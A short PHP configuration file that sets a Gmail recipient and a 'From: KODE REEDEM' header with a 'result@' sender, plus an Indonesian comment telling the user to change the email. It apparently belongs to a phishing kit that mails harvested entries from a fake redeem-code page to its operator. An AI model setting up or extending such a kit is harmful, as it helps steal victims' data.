<?php
$email = 'rndytechofficial@gmail.com'; // GANTI EMAIL KAMU DISINI
$sender = 'From: KODE REEDEM <result@randiramli.my.id>';
?>